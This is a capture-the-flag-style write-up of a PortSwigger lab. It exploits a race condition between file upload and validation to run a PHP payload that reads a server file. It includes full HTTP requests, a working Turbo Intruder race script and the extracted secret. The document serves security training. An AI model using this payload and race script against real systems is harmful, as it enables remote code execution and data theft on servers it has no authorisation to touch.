# PortSwigger Expert Lab: Race Condition File Upload Bypass

**Author:** Neelesh Pandey  
**Platform:** PortSwigger Web Security Academy  
**Difficulty:** Expert  
**Category:** File Upload + Race Condition  
**Lab:** Remote code execution via web shell upload  

---

## Overview

This lab demonstrates a sophisticated attack that combines two vulnerability classes — **file upload validation bypass** and **race condition exploitation**. The server correctly validates uploaded files and deletes malicious ones, but a narrow execution window between upload and deletion can be exploited to execute arbitrary code.

This is not a simple upload bypass. The server's validation works correctly — the bypass exists purely in the **timing** of the request, not a flaw in the validation logic itself.

---

## The Core Concept — Why This Works

Most file upload labs involve tricking the server's validation (wrong content-type, blacklist bypass, polyglot files). This lab is different. The validation here actually works — it correctly detects and deletes the PHP file.

The vulnerability is in the **execution order:**

```
1. File is uploaded → temporarily saved to disk
2. Server validates the file
3. If invalid → file is deleted
```

Between steps 1 and 3, there is a tiny window where the file **exists on disk and is executable**. If you can send a GET request to that file during this window — before deletion — the PHP code executes.

This is a **Time-of-Check to Time-of-Use (TOCTOU)** race condition.

---

## Why Previous Techniques Failed

Before reaching the race condition approach, standard bypass techniques were attempted and failed:

| Technique | Result | Why |
|-----------|--------|-----|
| Content-Type: image/jpeg with PHP payload | Blocked | Server validated file content, not just header |
| Double extension (exploit.php.jpg) | Blocked | Server parsed the real extension correctly |
| Null byte injection (exploit.php%00.jpg) | Blocked | Modern server, not vulnerable to null bytes |
| Polyglot (JPEG + PHP) | Blocked | Server stripped/rejected executable content |

The server's validation was genuinely robust against all standard bypasses. The attack surface was not the validation logic — it was the **timing** between upload and validation.

---

## Reconnaissance

### Step 1 — Understand Normal File Upload Flow

Logged in and uploaded a legitimate image as avatar. Intercepted in Burp Proxy:

```
POST /my-account/avatar HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="avatar"; filename="avatar.jpg"
Content-Type: image/jpeg

<image data>
------boundary--
```

The uploaded file was fetched via:

```
GET /files/avatars/avatar.jpg HTTP/1.1
```

**Key observation:** Files are stored at `/files/avatars/<filename>` — meaning if a PHP file were to exist there even briefly, the server would execute it.

### Step 2 — Craft the Malicious Payload

Created `exploit.php` containing:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

This reads and outputs the contents of Carlos's secret file when executed server-side.

---

## Exploitation — Race Condition via Turbo Intruder

### The Strategy

Send the POST upload request and multiple GET fetch requests **simultaneously** so that at least one GET request hits the file during the window between upload and deletion.

### Step 1 — Capture Both Requests in Burp

Captured two requests in Proxy > HTTP History:

**Request 1 — POST upload (malicious PHP):**
```
POST /my-account/avatar HTTP/1.1
Host: <lab-id>.web-security-academy.net
Cookie: session=<your-session>
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------boundary--
```

**Request 2 — GET fetch (attempt execution):**
```
GET /files/avatars/exploit.php HTTP/1.1
Host: <lab-id>.web-security-academy.net
Cookie: session=<your-session>
```

### Step 2 — Turbo Intruder Race Condition Script

Sent the POST request to Turbo Intruder (right-click → Extensions → Turbo Intruder → Send to Turbo Intruder).

Used the following script — the `gate` mechanism is critical here. It holds all requests until every byte is ready, then releases them all simultaneously:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=10,
    )

    # POST request to upload the PHP file
    request1 = '''POST /my-account/avatar HTTP/1.1
Host: <lab-id>.web-security-academy.net
Cookie: session=<your-session>
Content-Type: multipart/form-data; boundary=----boundary
Content-Length: <length>

------boundary
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------boundary--'''

    # GET request to fetch and execute the PHP file
    request2 = '''GET /files/avatars/exploit.php HTTP/1.1
Host: <lab-id>.web-security-academy.net
Cookie: session=<your-session>

'''

    # Queue the POST with gate tag — held until openGate
    engine.queue(request1, gate='race1')

    # Queue 5 GET requests with same gate tag
    for x in range(5):
        engine.queue(request2, gate='race1')

    # Release ALL requests simultaneously
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

### Step 3 — Results

After running the attack, the results showed mixed responses:

| Request | Response | Body |
|---------|----------|------|
| POST /my-account/avatar | 200 | Avatar uploaded |
| GET /files/avatars/exploit.php | 404 | File not found (deleted before request hit) |
| GET /files/avatars/exploit.php | 404 | File not found |
| GET /files/avatars/exploit.php | **200** | **aBj51Bn1ujvZn3o1ZiM2SJq2reLJETLX** |
| GET /files/avatars/exploit.php | 404 | File not found |
| GET /files/avatars/exploit.php | 404 | File not found |

One GET request hit the execution window — the file existed on disk, PHP executed, and Carlos's secret was returned.

**Secret extracted:** `aBj51Bn1ujvZn3o1ZiM2SJq2reLJETLX`

---

## Attack Flow Summary

```
1. Upload exploit.php via POST ──────────────────────────────┐
                                                              ↓
2. File saved to /files/avatars/exploit.php          [RACE WINDOW]
                                                              ↓
3. Server begins validation ──── GET requests fire ──→ PHP executes
                                                              ↓
4. Validation completes → file deleted               Secret returned
```

The race window is typically a few milliseconds. The `gate` mechanism in Turbo Intruder ensures all requests are sent as close to simultaneously as possible, maximising the chance of hitting that window.

---

## Why the Gate Mechanism is Critical

Without the gate, requests would be sent sequentially — the GET requests would arrive either all before the upload completes (404 — file doesn't exist yet) or all after deletion (404 — file already gone).

The gate holds the final byte of every request until `openGate()` is called, then flushes them all at once. This synchronises the timing so the POST and GET requests arrive at the server within the same millisecond window.

---

## Key Takeaways

- **Race conditions exist in validation logic, not just business logic** — any server that temporarily stores a file before validating it is potentially vulnerable to this attack
- **A bypass doesn't always mean fooling the filter** — here the filter worked correctly. The vulnerability was in the time gap between save and delete, not in the filter itself
- **Parallel request tools are essential for race conditions** — Burp's standard Repeater sends requests sequentially; Turbo Intruder's gate mechanism is purpose-built for synchronised timing attacks
- **Not all GET requests will succeed** — this attack is probabilistic. One in five succeeded here. In a real engagement you might need more parallel requests or multiple attempts
- **This technique applies beyond file upload** — any operation that has a TOCTOU gap (check then use) is potentially vulnerable: password reset token validation, two-factor authentication windows, coupon code redemption

---

## Real-World Relevance

This attack pattern appears in real applications wherever:
- Files are temporarily stored before asynchronous validation (virus scanning, content moderation)
- Cloud storage pre-signed URLs have delayed permission checks
- CDN edge caches serve files before origin validation completes

In a real pentest or bug bounty, finding this requires understanding the application's file processing pipeline — not just testing upload endpoints with standard bypasses.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Burp Suite Professional | Proxy, HTTP history, request capture |
| Turbo Intruder | Synchronised parallel request sending via gate mechanism |
| PHP | Payload language for server-side code execution |

---

## References

- [PortSwigger — Race Conditions](https://portswigger.net/web-security/race-conditions)
- [PortSwigger — File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
- [TOCTOU Race Conditions — OWASP](https://owasp.org/www-community/vulnerabilities/Time_of_check_time_of_use)
- [Turbo Intruder Documentation](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)

---

*Write-up by Neelesh Pandey — [GitHub](https://github.com/Neelesh707) | [LinkedIn](https://www.linkedin.com/in/neelesh-pandey021/)*
